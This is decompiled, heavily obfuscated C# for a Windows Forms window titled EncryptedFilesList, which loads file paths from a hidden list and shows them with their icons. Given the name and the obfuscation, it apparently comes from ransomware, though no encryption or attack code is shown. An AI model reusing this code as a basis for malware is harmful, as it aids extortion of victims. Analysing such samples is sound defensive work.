using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using ns0;

namespace ns1;

public class EncryptedFilesList : Form
{
	private readonly Class3 class3_0;

	private IContainer icontainer_0;

	private ListView listView_0;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	public EncryptedFilesList()
	{
		method_1();
		class3_0 = new Class3();
	}

	private void method_0(object sender, EventArgs e)
	{
		ImageList val = Delegate232.smethod_0();
		List<string> object_ = class3_0.method_0(Class3.string_0);
		if (Delegate22.smethod_0(Delegate240.smethod_0(object_, Class9.smethod_0(48)), Class10.smethod_0(22)))
		{
			return;
		}
		List<string>.Enumerator enumerator_ = Delegate87.smethod_0(object_);
		try
		{
			while (Delegate203.smethod_0(ref enumerator_))
			{
				string string_ = Delegate195.smethod_0(ref enumerator_);
				try
				{
					Delegate60.smethod_0(Delegate213.smethod_0(val), Delegate43.smethod_0(string_));
				}
				catch (Exception)
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
		Delegate12.smethod_0(listView_0, val);
		int num = Class9.smethod_0(52);
		enumerator_ = Delegate87.smethod_0(class3_0.method_0(Class3.string_0));
		try
		{
			while (Delegate203.smethod_0(ref enumerator_))
			{
				string string_2 = Delegate195.smethod_0(ref enumerator_);
				ListViewItem val2 = Delegate10.smethod_0(Delegate74.smethod_0(string_2), num);
				Delegate18.smethod_0(Delegate5.smethod_0(val2), Delegate167.smethod_0(Delegate226.smethod_0(string_2)));
				Delegate58.smethod_0(Delegate122.smethod_0(listView_0), val2);
				num += Class9.smethod_0(56);
			}
		}
		finally
		{
			((IDisposable)enumerator_).Dispose();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			Delegate191.smethod_0(icontainer_0);
		}
		Delegate17.smethod_0(this, disposing);
	}

	private void method_1()
	{
		//IL_01e0: Unknown result type (might be due to invalid IL or missing references)
		listView_0 = Delegate7.smethod_0();
		columnHeader_0 = Delegate138.smethod_0();
		columnHeader_1 = Delegate138.smethod_0();
		Delegate125.smethod_0(this);
		Delegate92.smethod_0(listView_0, (byte)Class9.smethod_0(60) != 0);
		ColumnHeaderCollection object_ = Delegate16.smethod_0(listView_0);
		ColumnHeader[] array = new ColumnHeader[Class9.smethod_0(64)];
		array[Class9.smethod_0(68)] = columnHeader_0;
		array[Class9.smethod_0(72)] = columnHeader_1;
		Delegate63.smethod_0(object_, (ColumnHeader[])(object)array);
		Delegate6.smethod_0(listView_0, (byte)Class9.smethod_0(76) != 0);
		Delegate88.smethod_0(listView_0, new Point(Class9.smethod_0(80), Class9.smethod_0(84)));
		Delegate54.smethod_0(listView_0, (byte)Class9.smethod_0(88) != 0);
		Delegate103.smethod_1(listView_0, Class10.smethod_0(403));
		Delegate214.smethod_0(listView_0, new Size(Class9.smethod_0(92), Class9.smethod_0(96)));
		Delegate145.smethod_0(listView_0, Class9.smethod_0(100));
		Delegate192.smethod_0(listView_0, (byte)Class9.smethod_0(104) != 0);
		Delegate147.smethod_0(listView_0, (View)Class9.smethod_0(108));
		Delegate101.smethod_0(columnHeader_0, Class10.smethod_0(426));
		Delegate114.smethod_0(columnHeader_0, Class9.smethod_0(112));
		Delegate101.smethod_0(columnHeader_1, Class10.smethod_0(435));
		Delegate114.smethod_0(columnHeader_1, Class9.smethod_0(116));
		Delegate27.smethod_0(this, new SizeF(Class9.smethod_2(120), Class9.smethod_2(124)));
		Delegate109.smethod_0(this, (AutoScaleMode)Class9.smethod_0(128));
		Delegate164.smethod_0(this, new Size(Class9.smethod_0(132), Class9.smethod_0(136)));
		Delegate28.smethod_0(Delegate194.smethod_0(this), (Control)(object)listView_0);
		Delegate100.smethod_0(this, (FormBorderStyle)Class9.smethod_0(140));
		Delegate144.smethod_0(this, new Padding(Class9.smethod_0(144)));
		Delegate188.smethod_0(this, (byte)Class9.smethod_0(148) != 0);
		Delegate15.smethod_0(this, (byte)Class9.smethod_0(152) != 0);
		Delegate103.smethod_0(this, Class10.smethod_0(452));
		Delegate205.smethod_0(this, (byte)Class9.smethod_0(156) != 0);
		Delegate200.smethod_0(this, (byte)Class9.smethod_0(160) != 0);
		Delegate218.smethod_0(this, Class10.smethod_0(489));
		Delegate64.smethod_0(this, method_0);
		Delegate102.smethod_0(this, (byte)Class9.smethod_0(164) != 0);
	}
}
